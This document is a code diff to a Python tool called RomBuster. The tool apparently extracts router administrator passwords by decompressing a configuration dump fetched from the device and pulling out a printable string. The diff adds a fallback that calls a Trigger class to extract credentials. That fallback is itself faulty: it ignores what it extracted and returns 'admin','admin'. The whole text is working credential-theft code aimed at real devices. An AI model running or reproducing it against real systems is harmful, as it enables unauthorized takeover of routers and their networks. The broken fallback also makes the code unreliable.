@@ -29,6 +29,7 @@ import requests
 
 import http.client
 
+from .trigger import Trigger
 from .deps.lzs_decompress import LZSDecompress, RingList
 
 
@@ -41,16 +42,19 @@ class RomBuster:
                 verify=False,
                 timeout=3
             )
-        except Exception:
-            return None
 
-        username = 'admin'
-        try:
+            username = 'admin'
             data = response.content[8568:]
             result, window = LZSDecompress(data, RingList(2048))
-        except Exception:
-            return None
 
-        password = re.findall("([\040-\176]{5,})", result)
-        if len(password):
-            return username, password[0]
+            password = re.findall("([\040-\176]{5,})", result)
+            if len(password):
+                return username, password[0]
+        except Exception:
+            trigger = Trigger(address.split(':')[0])
+            username, password = trigger.extract_credentials()
+
+            if username is None and password is None:
+                return None
+
+            return 'admin', 'admin'
